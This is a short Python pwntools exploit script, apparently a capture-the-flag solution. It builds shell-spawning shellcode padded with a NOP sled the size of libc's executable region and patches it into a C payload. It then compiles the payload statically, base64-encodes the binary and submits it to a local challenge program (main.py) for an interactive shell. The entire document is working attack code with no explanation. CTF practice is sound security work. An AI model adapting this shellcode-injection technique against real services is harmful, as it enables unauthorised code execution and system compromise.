#!/usr/bin/env python3

import base64
import subprocess
from pathlib import Path

from pwn import *

context.terminal = ["tmux", "splitw", "-v"]
context.arch = "amd64"

# Derived from examination of Python process maps.
libc_rx_size = 0x4e000

this_script_dir = Path(__file__).absolute().parent
raw_payload_source = this_script_dir / "payload.c"
fixed_up_payload_source = this_script_dir / "fixed_payload.c"
compiled_elf = this_script_dir / "payload.elf"

# Patch our shellcode in to the C source.
sc = asm(shellcraft.sh())
nop = b"\x90"

sc = nop * (libc_rx_size - len(sc)) + sc
sc = ", ".join(hex(i) for i in sc)
fixed_up_payload_source.write_text(raw_payload_source.read_text().replace("// FIXME", sc))

# Compile the executable.
subprocess.check_output([
    "musl-gcc",
    str(fixed_up_payload_source),
    "-o",
    str(compiled_elf),
    "-static",
])

elf_bytes = compiled_elf.read_bytes()
encoded_elf_bytes = base64.b64encode(elf_bytes)

io = process(["python3", "main.py"])

if args.GDB:
    gdb.attach(io, """
        # continue
    """)

io.sendlineafter("Your Binary(base64):\n", encoded_elf_bytes)
io.interactive()
